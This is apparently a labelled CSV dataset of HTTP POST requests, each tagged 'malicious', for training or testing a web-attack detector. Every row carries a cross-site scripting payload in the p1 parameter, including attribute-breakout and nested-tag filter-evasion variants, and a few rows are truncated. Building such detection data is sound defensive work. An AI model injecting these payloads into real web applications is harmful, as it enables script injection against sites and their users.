method,url,uri,query,headers,body,type
POST,/example,/example,p1=<script>alert(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<script>console.log(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<script>confirm(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<script>prompt(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scr,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>alert(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>console.log(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>confirm(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>prompt(299792458)</script>&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>alert(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>console.log(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>confirm(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,"p1=""><script>prompt(299792458)</script><""&p2=p2val","Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>alert(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>console.log(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>confirm(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>prompt(299792458)</script>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>alert(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>console.log(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>confirm(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1='><script>prompt(299792458)</script><'&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>alert(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>console.log(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>confirm(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRIPT>prompt(299792458);</SCRIPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>alert(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>console.log(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>confirm(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<script>pt>prompt(299792458);</scr</script>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>alert(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>console.log(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>confirm(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<SCRI<script>PT>prompt(299792458);</SCR</script>IPT>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=<scri<scr<script>ipt>pt>alert(299792458);</scr</sc</script>ript>ipt>&p2=p2val,"Cookie: c=cval
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
